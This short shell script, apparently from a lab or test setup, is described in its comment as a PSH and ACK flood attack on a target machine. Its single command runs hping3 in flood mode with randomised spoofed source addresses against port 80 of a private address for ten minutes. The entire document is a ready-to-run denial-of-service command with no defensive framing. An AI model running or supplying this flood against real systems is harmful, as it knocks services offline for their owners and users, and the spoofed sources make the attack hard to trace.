# Script to do a PSH and ACK Flood attack on the target machine

# Execute the PSH and ACK Flood attack
timeout 10m hping3 --flood --rand-source -PA -p 80 192.168.0.15

